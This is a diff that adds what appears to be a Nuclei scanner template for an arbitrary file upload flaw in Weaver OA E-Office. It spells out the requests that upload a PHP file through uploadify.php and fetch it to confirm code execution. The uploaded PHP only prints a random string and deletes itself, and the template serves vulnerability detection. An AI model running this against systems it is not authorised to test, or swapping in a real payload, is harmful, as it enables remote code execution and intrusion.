@@ -1,0 +1,61 @@
+id: weaver-jquery-file-upload
+
+info:
+  name: OA E-Office jQuery - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: Arbitrary File Upload in OA E-Office jQuery.
+  reference:
+    - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="泛微-EOffice"
+    product: e-office
+    vendor: weaver
+  tags: weaver,e-office,oa,instrusive,rce,intrusive,vuln
+
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo "{{string}}";unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      - |
+        GET /attachment/{{attachmentID}}/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: attachmentID
+        internal: true
+        regex:
+          - "[0-9]{10}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_3 == 200 && contains(body_3,'{{string}}')"
+        condition: and
+# digest: 490a0046304402206df52fadc7fe530d8068dd3ef6828291118fe7da8e5c98452ecc6304a50871b102203ade5b562e7ca381ce2683ebad99857b4ccb915c28e8a87d67cb6ef36e22c42c:922c64590222798bb761d5b6d8e72950
